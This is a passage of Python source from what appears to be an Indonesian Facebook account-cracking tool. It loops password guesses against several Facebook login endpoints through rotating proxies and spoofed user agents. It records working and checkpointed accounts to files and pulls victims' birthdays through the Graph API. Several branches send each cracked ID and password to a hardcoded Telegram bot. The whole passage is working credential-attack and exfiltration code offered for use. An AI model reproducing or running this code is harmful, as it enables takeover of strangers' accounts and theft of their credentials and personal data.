			p = ses.get(f'https://{url}/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2F{url}%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":f"https://{url}/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': f'{url}','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': f'https://{url}','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': f'https://{url}/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2F{url}%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post(f'https://{url}/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False) 
			if "checkpoint" in ses.cookies.get_dict():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				data = (f'{idf}|{pw}')
				if data in check:pass
				else:
					check.append(data)
					cp+=1
					if 'ya' in send2:
						tree= Tree(Panel.fit(f"{K2} {idf} {P2}| {K2}{pw} "))
						tree.add(Panel.fit(f"{K2}{ua}"))
						print(tree)
						requests.post(f"https://api.telegram.org/bot6266414444:AAEhP5Vgc-k3__Ph6XQh_joRNgn2yr8xKS0/sendMessage?chat_id=6051296202&text={idf} <C=P> {pw}")
					else:
						try:
							token = open('data/token.txt','r').read()
							bas = {"cookie":open('data/cookie.txt','r').read()}
							ttl = ses.get(f'https://graph.facebook.com/{idf}?fields=birthday&access_token={token}',cookies=bas).json()['birthday']
							m, d, y = ttl.split('/')
							m = month[m]
							tree= Tree(Panel.fit(f"{K2} TTL "))
							tree.add(Panel.fit(f"{K2}{d} {m} {y}"))
							print(tree)
							save = f'{idf}|{pw}|{d} {m} {y}'
							open('CP/'+check,'a').write(save+'\n')
							break
						except:
							tree= Tree(Panel.fit(f"{K2} {idf} {P2}| {K2}{pw} "))
							tree.add(Panel.fit(f"{K2}{ua}"))
							print(tree)
							open('CP/'+check,'a').write(idf+'|'+pw+'\n')
							break
			elif "c_user" in ses.cookies.get_dict():
				kuki = convert(ses.cookies.get_dict())
				idf = re.findall('c_user=(.*);xs', kuki)[0]
				data = (f'{idf}|{pw}')
				if data in live:pass
				else:
					live.append(data)
					ok+=1
					open('OK/'+live,'a').write(data+'\n')
					if "jancok" in delive:
						tree= Tree(Panel.fit(f"{H2} {idf} {P2}| {H2}{pw} "))
						tree.add(Panel.fit(f"{H2}{kuki}"))
						print(tree)
						break
					elif "makasih" in delive:
						tree= Tree(Panel.fit(f"{H2} {idf} {P2}| {H2}{pw} "))
						tree.add(Panel.fit(f"{H2}{kuki}"))
						print(tree)
						requests.post(f"https://api.telegram.org/bot6266414444:AAEhP5Vgc-k3__Ph6XQh_joRNgn2yr8xKS0/sendMessage?chat_id=6051296202&text={idf} <=> {pw}")
						break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

# ---> metode ke 3
def reguler(idf,pwx,awal,url):
	global loop,ok,cp
	ses = requests.Session()
	xx = open('.proxy.txt','r').read().splitlines()
	ua = random.choice(ugen)
	ya = random.choice(xx)
	proxy = {'http': 'socks5://'+random.choice(xx)}
	ahir = str(datetime.now()-awal).split('.')[0]
	prog.update(des,description=f" {H2}{ya} {P2}{len(id)} <=> {(loop)} {H2}live {P2}:-{H2}{(ok)} {K2}check {P2}:-{K2}{(cp)} {P2}{ahir}")
	prog.advance(des)
	for pw in pwx:
		try:
			ses.headers.update({'Host': f'{url}','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			link = ses.get(f'https://{url}/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2F{url}%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': f'{url}','x-fb-rlafr': '0','access-control-allow-origin': '*','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-debug': 'AXRLN2ab6tbNBxFWS6kiERe8mEyeHkpYgc1xM77joSCak8hY1B2+tWfeptUXVmRpMqno2j95r13+cw0bLoOi4A==','content-length': '2141','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': f'https://{url}','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': f'https://{url}/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2F{url}%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			link = random.choice([f"https://{url}/login/device-based/regular/login/?api_key=140810032656374&auth_token=63ed3e768f0e783f4cc81a6b1026c500&skip_api_login=1&signed_next=1&next=https%3A%2F%2F{url}%2Fv14.0%2Fdialog%2Foauth%3Fclient_id%3D140810032656374%26redirect_uri%3Dhttps%253A%252F%252Faccounts.pixiv.net%252Fpigya%252Fproxy%252Fcallback%252Ffacebook%26response_type%3Dcode%26scope%3Demail%26state%3DGeDYUodE_pVN5pDXKBbhaF12RvXSU-30ikz4dZVHI8w%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd3e7e4df-8e7b-42c9-81a7-ee0e2abb19c9%26tp%3Dunspecified&refsrc=deprecated&app_id=140810032656374&cancel=https%3A%2F%2Faccounts.pixiv.net%2Fpigya%2Fproxy%2Fcallback%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DGeDYUodE_pVN5pDXKBbhaF12RvXSU-30ikz4dZVHI8w%23_%3D_&lwv=100&locale2=id_ID&refid=9","https://{url}/login/device-based/regular/login/?api_key=213560439114&auth_token=7ade521eceaab1458866d9821149d64f&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fmobile.facebook.com%2Fv2.9%2Fdialog%2Foauth%3Fapp_id%3D213560439114%26cbt%3D1677182177996%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df11da1fc663793c%2526domain%253Dwww.starmakerstudios.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.starmakerstudios.com%25252Ff1245028efb5658%2526relation%253Dopener%26client_id%3D213560439114%26display%3Dtouch%26domain%3Dwww.starmakerstudios.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.starmakerstudios.com%252Flogin%252Fpage%253Freturn_url%253D%252Finstrumental%252Fupload%26locale%3Dzh_CN%26logger_id%3Df2bda15588a0498%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1931b4149a3a44%2526domain%253Dwww.starmakerstudios.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.starmakerstudios.com%25252Ff1245028efb5658%2526relation%253Dopener%2526frame%253Df3f39a10ef963dc%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv2.9%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&refsrc=deprecated&app_id=213560439114&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1931b4149a3a44%26domain%3Dwww.starmakerstudios.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.starmakerstudios.com%252Ff1245028efb5658%26relation%3Dopener%26frame%3Df3f39a10ef963dc%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&lwv=100&locale2=id_ID&refid=9"])
			#"https://m.facebook.com/login/device-based/regular/login/?api_key=213560439114&auth_token=5f8c7178a13395b4cd272a3e1897de8b&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D213560439114%26cbt%3D1677419913361%26e2e%3D%257B%2522init%2522%253A1677419913361%257D%26ies%3D1%26sdk%3Dandroid-14.1.1%26sso%3Dchrome_custom_tab%26nonce%3D063978e3-28aa-4a0f-bbc6-9272a9973fcb%26scope%3Duser_birthday%252Copenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%252281b4243d-16d4-4293-aa47-6359abf5abdd%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522lgg1tdnv3jjnt4houtbf%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.starmakerinteractive.starmaker%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DP1LSLToQntEH2uBpWwB7VQimlXskVC9z-rHLt8TMxh0%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D81b4243d-16d4-4293-aa47-6359abf5abdd%26tp%3Dunspecified&refsrc=deprecated&app_id=213560439114&cancel=fbconnect%3A%2F%2Fcct.com.starmakerinteractive.starmaker%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252281b4243d-16d4-4293-aa47-6359abf5abdd%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522lgg1tdnv3jjnt4houtbf%2522%257D&lwv=100&locale2=id_ID&refid=9"])
			po = ses.post(link,data=data,headers=headers,allow_redirects=False)
			if "checkpoint" in ses.cookies.get_dict():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				data = (f'{idf}|{pw}')
				if data in check:pass
				else:
					check.append(data)
					cp+=1
					if 'ya' in send2:
						tree= Tree(Panel.fit(f"{K2} {idf} {P2}| {K2}{pw} "))
						tree.add(Panel.fit(f"{K2}{ua}"))
						print(tree)
						requests.post(f"https://api.telegram.org/bot6266414444:AAEhP5Vgc-k3__Ph6XQh_joRNgn2yr8xKS0/sendMessage?chat_id=6051296202&text={idf} <C=P> {pw}")
					else:
						try:
							token = open('data/token.txt','r').read()
							bas = {"cookie":open('data/cookie.txt','r').read()}
							ttl = ses.get(f'https://graph.facebook.com/{idf}?fields=birthday&access_token={token}',cookies=bas).json()['birthday']
							m, d, y = ttl.split('/')
							m = month[m]
							tree= Tree(Panel.fit(f"{K2} TTL "))
							tree.add(Panel.fit(f"{K2}{d} {m} {y}"))
							print(tree)
							save = f'{idf}|{pw}|{d} {m} {y}'
							open('CP/'+check,'a').write(save+'\n')
							break
						except:
							tree= Tree(Panel.fit(f"{K2} {idf} {P2}| {K2}{pw} "))
							tree.add(Panel.fit(f"{K2}{ua}"))
							print(tree)
							open('CP/'+check,'a').write(idf+'|'+pw+'\n')
							break
			elif "c_user" in ses.cookies.get_dict():
				kuki = convert(ses.cookies.get_dict())
				idf = re.findall('c_user=(.*);xs', kuki)[0]
				data = (f'{idf}|{pw}')
				if data in live:pass
				else:
					live.append(data)
					ok+=1
					open('OK/'+live,'a').write(data+'\n')
					if "jancok" in delive:
						tree= Tree(Panel.fit(f"{H2} {idf} {P2}| {H2}{pw} "))
						tree.add(Panel.fit(f"{H2}{kuki}"))
						print(tree)
						break
					elif "makasih" in delive:
						tree= Tree(Panel.fit(f"{H2} {idf} {P2}| {H2}{pw} "))
						tree.add(Panel.fit(f"{H2}{kuki}"))
						print(tree)
						requests.post(f"https://api.telegram.org/bot6266414444:AAEhP5Vgc-k3__Ph6XQh_joRNgn2yr8xKS0/sendMessage?chat_id=6051296202&text={idf} <=> {pw}")
						break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

# ---> metode ke 4
def acync(idf,pwx,awal):
	global loop,ok,cp
	ses = requests.Session()
	xx = open('.proxy.txt','r').read().splitlines()
	proxy = {'http': 'socks5://'+random.choice(xx)}
	ua = random.choice(ugen)
	ya = random.choice(xx)
	ahir = str(datetime.now()-awal).split('.')[0]
	prog.update(des,description=f" {H2}{ya} {P2}{len(id)} <=> {(loop)} {H2}live {P2}:-{H2}{(ok)} {K2}check {P2}:-{K2}{(cp)} {P2}{ahir}")
	prog.advance(des)
	for pw in pwx:
		try:
			#ses.headers.update({'Host': 'iphone.latest.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://iphone.latest.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://iphone.latest.facebook.com/login/?ref=dbl&fl&login_from_aymh=1&refid=9','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			link = ses.get('https://iphone.latest.facebook.com/login/?ref=dbl&fl&login_from_aymh=1&refid=9')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			heade={'Host': 'iphone.latest.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://iphone.latest.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://iphone.latest.facebook.com/login/?ref=dbl&fl&login_from_aymh=1&refid=9','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://iphone.latest.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=9',data=data,headers=heade,allow_redirects=False)
			if "checkpoint" in ses.cookies.get_dict():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				data = (f'{idf}|{pw}')
				if data in check:pass
				else:
					check.append(data)
					cp+=1
					if 'ya' in send2:
						tree= Tree(Panel.fit(f"{K2} {idf} {P2}| {K2}{pw} "))
						tree.add(Panel.fit(f"{K2}{ua}"))
						print(tree)
						requests.post(f"https://api.telegram.org/bot6266414444:AAEhP5Vgc-k3__Ph6XQh_joRNgn2yr8xKS0/sendMessage?chat_id=6051296202&text={idf} <C=P> {pw}")
					else:
						try:
							token = open('data/token.txt','r').read()
							bas = {"cookie":open('data/cookie.txt','r').read()}
							ttl = ses.get(f'https://graph.facebook.com/{idf}?fields=birthday&access_token={token}',cookies=bas).json()['birthday']
							m, d, y = ttl.split('/')
							m = month[m]
							tree= Tree(Panel.fit(f"{K2} TTL "))
							tree.add(Panel.fit(f"{K2}{d} {m} {y}"))
							print(tree)
							save = f'{idf}|{pw}|{d} {m} {y}'
							open('CP/'+check,'a').write(save+'\n')
							break
						except:
							tree= Tree(Panel.fit(f"{K2} {idf} {P2}| {K2}{pw} "))
							tree.add(Panel.fit(f"{K2}{ua}"))
							print(tree)
							open('CP/'+check,'a').write(idf+'|'+pw+'\n')
							break
			elif "c_user" in ses.cookies.get_dict():
				kuki = convert(ses.cookies.get_dict())
				idf = re.findall('c_user=(.*);xs', kuki)[0]
				data = (f'{idf}|{pw}')
				if data in live:pass
				else:
					live.append(data)
					ok+=1
					open('OK/'+live,'a').write(data+'\n')
					if "jancok" in delive:
						tree= Tree(Panel.fit(f"{H2} {idf} {P2}| {H2}{pw} "))
						tree.add(Panel.fit(f"{H2}{kuki}"))
						print(tree)
						break
					elif "makasih" in delive:
						tree= Tree(Panel.fit(f"{H2} {idf} {P2}| {H2}{pw} "))
						tree.add(Panel.fit(f"{H2}{kuki}"))
						print(tree)
						requests.post(f"https://api.telegram.org/bot6266414444:AAEhP5Vgc-k3__Ph6XQh_joRNgn2yr8xKS0/sendMessage?chat_id=6051296202&text={idf} <=> {pw}")
						break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1


def new(idf,pwx,awal):
	global loop,ok,cp
	ses = requests.Session()
	xx = open('.proxy.txt','r').read().splitlines()
	proxy = {'http': 'socks5://'+random.choice(xx)}
	ua = random.choice(ugen)
	ya = random.choice(xx)
	ahir = str(datetime.now()-awal).split('.')[0]
	prog.update(des,description=f" {H2}{ya} {P2}{len(id)} <=> {(loop)} {H2}live {P2}:-{H2}{(ok)} {K2}check {P2}:-{K2}{(cp)} {P2}{ahir}")
	prog.advance(des)
	for pw in pwx:
		try:
			r = par(session.get("https://m.facebook.com/login/device-based/regular/login/?login_attempt=1",
			headers={
                    "host":"m.facebook.com",
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "accept-encoding":"gzip, deflate",
                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8",
                    "cache-control":"max-age=0",
                    "Connection": "keep-alive",
                    "sec-fetch-dest":"document",
                    "sec-fetch-mode":"navigate",
                    "sec-fetch-site":"none",
                    "sec-fetch-user":"?1",
                    "upgrade-insecure-requests":"1",
                    "user-agent":"Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.188 Safari/537.36 CrKey/1.54.250320"}).text, "html.parser")
			form = r.find("form", {"method":"post", "id":"login_form"})
			data = {x.get("name"):x.get("value") for x in form.findAll("input", {"type":"hidden"})}
			data.update(
                    {
                        "timezone":generate_timezone(),
                        "lgndim":hashlib.md5((idf + pw).encode('utf-8')).hexdigest(),
                        "prefill_contact_point": f"{idf} {pw}",
                        "email":idf,
                        "encpass":"#PWD_BROWSER:0:%s:%s"%(str(round(tm() * 1000)).split(".")[0], pw)
                     }
                )
			for x in list(data.keys()):
				if data[x] is None:
					data.pop(x)
			post_data = "&".join([f"{key}={value}" for key, value in data.items()]).encode("utf-8")
			content_length = str(len(post_data))
			post = par(session.post("https://m.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100", data=post_data, headers={
"host":"m.facebook.com",
"accept": "*/*",
"accept-encoding":"gzip, deflate",
"accept-language":"en-GB,en-US;q=0.9,en;q=0.8",
"cache-control":"max-age=0",
"Connection": "keep-alive",
"content-length": content_length,
"content-type":"application/x-www-form-urlencoded",
"origin":"https://m.facebook.com",
"x-requested-with": "mark.via.gp",
"referer":"https://m.facebook.com/login/device-based/regular/login/?login_attempt=1",
"upgrade-insecure-requests":"1",
"user-agent":ua}).text, "html.parser")
			if "checkpoint" in ses.cookies.get_dict():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				data = (f'{idf}|{pw}')
				if data in check:pass
				else:
					check.append(data)
					cp+=1
					if 'ya' in send2:
						tree= Tree(Panel.fit(f"{K2} {idf} {P2}| {K2}{pw} "))
						tree.add(Panel.fit(f"{K2}{ua}"))
						print(tree)
						requests.post(f"https://api.telegram.org/bot6266414444:AAEhP5Vgc-k3__Ph6XQh_joRNgn2yr8xKS0/sendMessage?chat_id=6051296202&text={idf} <C=P> {pw}")
					else:
						try:
							token = open('data/token.txt','r').read()
							bas = {"cookie":open('data/cookie.txt','r').read()}
							ttl = ses.get(f'https://graph.facebook.com/{idf}?fields=birthday&access_token={token}',cookies=bas).json()['birthday']
							m, d, y = ttl.split('/')
							m = month[m]
							tree= Tree(Panel.fit(f"{K2} TTL "))
							tree.add(Panel.fit(f"{K2}{d} {m} {y}"))
							print(tree)
							save = f'{idf}|{pw}|{d} {m} {y}'
							open('CP/'+check,'a').write(save+'\n')
							break
						except:
							tree= Tree(Panel.fit(f"{K2} {idf} {P2}| {K2}{pw} "))
							tree.add(Panel.fit(f"{K2}{ua}"))
							print(tree)
							open('CP/'+check,'a').write(idf+'|'+pw+'\n')
							break
			elif "c_user" in ses.cookies.get_dict():
				kuki = convert(ses.cookies.get_dict())
				idf = re.findall('c_user=(.*);xs', kuki)[0]
				data = (f'{idf}|{pw}')
				if data in live:pass
				else:
					live.append(data)
					ok+=1
					open('OK/'+live,'a').write(data+'\n')
					if "jancok" in delive:
						tree= Tree(Panel.fit(f"{H2} {idf} {P2}| {H2}{pw} "))
